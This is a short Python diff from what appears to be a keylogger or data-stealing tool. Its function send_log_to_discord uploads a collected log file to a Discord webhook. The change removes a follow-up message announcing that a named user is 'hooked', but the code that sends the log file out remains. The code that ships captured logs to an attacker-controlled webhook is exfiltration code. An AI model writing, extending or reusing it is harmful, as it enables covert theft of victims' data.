@@ -118,16 +118,6 @@ def send_log_to_discord():
                 response = requests.post(webhook_url, files=files)
                 if response.status_code == 200:
                     print('Log file sent successfully.')
-                    # Send a success message to Discord
-                    success_message = f"{user_name} hooked"
-                    data = {
-                        "content": success_message
-                    }
-                    response = requests.post(webhook_url, json=data)
-                    if response.status_code == 200:
-                        print('Success message sent successfully.')
-                    else:
-                        print(f'Failed to send success message. Status code: {response.status_code}')
                 else:
                     print(f'Failed to send log file. Status code: {response.status_code}')
     except Exception as e:
